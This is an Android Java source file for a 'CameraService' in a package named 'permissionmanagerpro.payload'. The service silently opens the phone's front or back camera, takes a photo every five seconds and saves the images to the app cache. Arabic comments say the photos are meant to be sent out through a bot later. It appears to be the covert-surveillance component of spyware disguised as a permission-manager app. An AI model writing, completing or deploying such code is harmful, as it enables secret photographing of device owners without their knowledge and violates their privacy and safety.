package com.example.permissionmanagerpro.payload;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.Camera;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.Nullable;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

public class CameraService extends Service {
    private Camera camera;
    private boolean running = true;
    private String side = "back";

    @Override
    public void onCreate() {
        super.onCreate();
        side = getIntent() != null ? getIntent().getStringExtra("camera_side") : "back";
        startCamera();
    }

    private void startCamera() {
        new Thread(() -> {
            try {
                int camId = side.equals("front") ? Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK;
                Camera.CameraInfo info = new Camera.CameraInfo();
                for (int i = 0; i < Camera.getNumberOfCameras(); i++) {
                    Camera.getCameraInfo(i, info);
                    if (info.facing == camId) {
                        camera = Camera.open(i);
                        break;
                    }
                }
                if (camera == null) camera = Camera.open();

                Camera.Parameters params = camera.getParameters();
                params.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
                camera.setParameters(params);
                camera.startPreview();

                while (running) {
                    camera.takePicture(null, null, (data, cam) -> {
                        try {
                            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
                            File f = new File(getCacheDir(), "cam_" + System.currentTimeMillis() + ".jpg");
                            FileOutputStream fos = new FileOutputStream(f);
                            bitmap.compress(Bitmap.CompressFormat.JPEG, 50, fos);
                            fos.close();
                            // إرسال الصورة عبر البوت (نحتاج لربط البوت هنا، لكن يمكنك إضافته لاحقاً)
                            Log.d("Camera", "Saved: " + f.getAbsolutePath());
                        } catch (Exception e) { e.printStackTrace(); }
                    });
                    Thread.sleep(5000); // كل 5 ثوان
                }
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        side = intent != null ? intent.getStringExtra("camera_side") : "back";
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        running = false;
        if (camera != null) { camera.stopPreview(); camera.release(); camera = null; }
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }
}